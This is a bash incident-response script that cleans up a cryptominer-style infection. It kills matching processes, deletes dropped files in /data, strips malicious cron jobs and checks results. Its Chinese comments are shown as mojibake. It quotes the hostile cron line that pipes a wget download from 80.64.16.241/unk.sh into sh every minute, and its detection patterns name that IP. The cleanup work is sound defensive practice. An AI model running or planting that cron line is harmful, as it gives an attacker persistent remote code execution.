#!/bin/bash
# ============================================================
# å¿«é€Ÿæ¸…ç†æ¶æ„è½¯ä»¶è„šæœ¬
# ============================================================

set -e

echo "=========================================="
echo "ğŸš¨ å¿«é€Ÿæ¸…ç†æ¶æ„è½¯ä»¶"
echo "=========================================="
echo ""

# 1. ç»ˆæ­¢å¯ç–‘è¿›ç¨‹
echo "[1/5] ç»ˆæ­¢å¯ç–‘è¿›ç¨‹..."
for pattern in "MUTA71VL" "CX81yM9aE" "UY" "80.64.16.241" "unk.sh"; do
    PIDS=$(ps aux | grep -i "$pattern" | grep -v grep | awk '{print $2}' 2>/dev/null || true)
    if [ -n "$PIDS" ]; then
        for pid in $PIDS; do
            if [ -n "$pid" ] && [ "$pid" != "$$" ]; then
                echo "  ç»ˆæ­¢è¿›ç¨‹ PID: $pid"
                sudo kill -9 "$pid" 2>/dev/null || true
            fi
        done
    fi
done
echo "  âœ… è¿›ç¨‹æ£€æŸ¥å®Œæˆ"
echo ""

# 2. åˆ é™¤å¯ç–‘æ–‡ä»¶
echo "[2/5] åˆ é™¤å¯ç–‘æ–‡ä»¶..."
SUSPICIOUS_FILES=("/data/MUTA71VL" "/data/CX81yM9aE" "/data/UY")
DELETED=0

for file in "${SUSPICIOUS_FILES[@]}"; do
    if [ -f "$file" ]; then
        echo "  åˆ é™¤: $file"
        sudo rm -f "$file" 2>/dev/null && DELETED=$((DELETED+1)) || true
    fi
done

if [ "$DELETED" -gt 0 ]; then
    echo "  âœ… å·²åˆ é™¤ $DELETED ä¸ªå¯ç–‘æ–‡ä»¶"
else
    echo "  âœ… æœªå‘ç°å¯ç–‘æ–‡ä»¶ï¼ˆå¯èƒ½å·²åˆ é™¤ï¼‰"
fi
echo ""

# 3. æ¸…ç†æ¶æ„å®šæ—¶ä»»åŠ¡
echo "[3/5] æ¸…ç†æ¶æ„å®šæ—¶ä»»åŠ¡..."
MALICIOUS_CRON="* * * * * wget -q -O - http://80.64.16.241/unk.sh | sh"

# æ¸…ç†ç”¨æˆ·å®šæ—¶ä»»åŠ¡
if crontab -l >/dev/null 2>&1; then
    CRON_BACKUP="/tmp/crontab_backup_$(date +%Y%m%d_%H%M%S).txt"
    crontab -l > "$CRON_BACKUP"
    echo "  å·²å¤‡ä»½åˆ°: $CRON_BACKUP"
    
    # æ£€æŸ¥æ˜¯å¦æœ‰æ¶æ„ä»»åŠ¡
    if crontab -l | grep -q "80.64.16.241\|unk.sh"; then
        echo "  âš ï¸  å‘ç°æ¶æ„å®šæ—¶ä»»åŠ¡ï¼Œæ­£åœ¨åˆ é™¤..."
        crontab -l | grep -v "80.64.16.241" | grep -v "unk.sh" | crontab -
        echo "  âœ… å·²åˆ é™¤æ¶æ„å®šæ—¶ä»»åŠ¡"
    else
        echo "  âœ… ç”¨æˆ·å®šæ—¶ä»»åŠ¡æ­£å¸¸"
    fi
else
    echo "  âœ… ç”¨æˆ·æ— å®šæ—¶ä»»åŠ¡"
fi
echo ""

# 4. æ£€æŸ¥ç³»ç»Ÿå®šæ—¶ä»»åŠ¡
echo "[4/5] æ£€æŸ¥ç³»ç»Ÿå®šæ—¶ä»»åŠ¡..."
if [ -f /etc/crontab ]; then
    if grep -q "80.64.16.241\|unk.sh" /etc/crontab 2>/dev/null; then
        echo "  âš ï¸  å‘ç°æ¶æ„ç³»ç»Ÿå®šæ—¶ä»»åŠ¡ï¼Œè¯·æ‰‹åŠ¨åˆ é™¤:"
        grep "80.64.16.241\|unk.sh" /etc/crontab | sed 's/^/    /'
        echo "  ç¼–è¾‘å‘½ä»¤: sudo nano /etc/crontab"
    else
        echo "  âœ… /etc/crontab æ­£å¸¸"
    fi
fi

# æ£€æŸ¥ /etc/cron.d/
if [ -d /etc/cron.d ]; then
    for cron_file in /etc/cron.d/*; do
        if [ -f "$cron_file" ] && [ "$(basename "$cron_file")" != ".placeholder" ]; then
            if grep -q "80.64.16.241\|unk.sh" "$cron_file" 2>/dev/null; then
                echo "  âš ï¸  å‘ç°æ¶æ„å®šæ—¶ä»»åŠ¡æ–‡ä»¶: $cron_file"
                echo "  å»ºè®®åˆ é™¤: sudo rm -f $cron_file"
            fi
        fi
    done
fi
echo ""

# 5. éªŒè¯æ¸…ç†ç»“æœ
echo "[5/5] éªŒè¯æ¸…ç†ç»“æœ..."
echo "  æ£€æŸ¥å¯ç–‘æ–‡ä»¶:"
if [ -f "/data/MUTA71VL" ] || [ -f "/data/CX81yM9aE" ] || [ -f "/data/UY" ]; then
    echo "    âš ï¸  ä»æœ‰å¯ç–‘æ–‡ä»¶å­˜åœ¨:"
    [ -f "/data/MUTA71VL" ] && echo "      /data/MUTA71VL"
    [ -f "/data/CX81yM9aE" ] && echo "      /data/CX81yM9aE"
    [ -f "/data/UY" ] && echo "      /data/UY"
else
    echo "    âœ… å¯ç–‘æ–‡ä»¶å·²åˆ é™¤"
fi

echo "  æ£€æŸ¥å¯ç–‘è¿›ç¨‹:"
if ps aux | grep -E "MUTA71VL|CX81yM9aE|80.64.16.241" | grep -v grep >/dev/null 2>&1; then
    echo "    âš ï¸  ä»æœ‰å¯ç–‘è¿›ç¨‹è¿è¡Œ"
    ps aux | grep -E "MUTA71VL|CX81yM9aE|80.64.16.241" | grep -v grep
else
    echo "    âœ… æ— å¯ç–‘è¿›ç¨‹è¿è¡Œ"
fi

echo "  æ£€æŸ¥æ¶æ„å®šæ—¶ä»»åŠ¡:"
if crontab -l 2>/dev/null | grep -q "80.64.16.241\|unk.sh"; then
    echo "    âš ï¸  ä»æœ‰æ¶æ„å®šæ—¶ä»»åŠ¡"
    crontab -l | grep "80.64.16.241\|unk.sh"
else
    echo "    âœ… æ— æ¶æ„å®šæ—¶ä»»åŠ¡"
fi

echo "  æ£€æŸ¥ç½‘ç»œè¿æ¥:"
if ss -tunp 2>/dev/null | grep -q "80.64.16.241"; then
    echo "    âš ï¸  ä»æœ‰åˆ°å¯ç–‘ IP çš„è¿æ¥"
    ss -tunp | grep "80.64.16.241"
else
    echo "    âœ… æ— åˆ°å¯ç–‘ IP çš„è¿æ¥"
fi
echo ""

# æ€»ç»“
echo "=========================================="
echo "æ¸…ç†å®Œæˆ"
echo "=========================================="
echo ""
echo "ä¸‹ä¸€æ­¥æ“ä½œ:"
echo "  1. æ›´æ”¹æ‰€æœ‰å¯†ç ï¼ˆSSHã€æ•°æ®åº“ã€åº”ç”¨ç­‰ï¼‰"
echo "  2. å®Œæˆ fail2ban å®‰è£…: sudo apt-get install fail2ban -y"
echo "  3. å®Œæˆé˜²ç«å¢™é…ç½®: sudo ufw allow 443/tcp"
echo "  4. è¿è¡Œå®‰å…¨æ‰«æ: sudo rkhunter --check"
echo "  5. ç›‘æ§ç³»ç»Ÿèµ„æº: watch -n 5 'ps aux --sort=-%cpu | head -10'"
echo ""

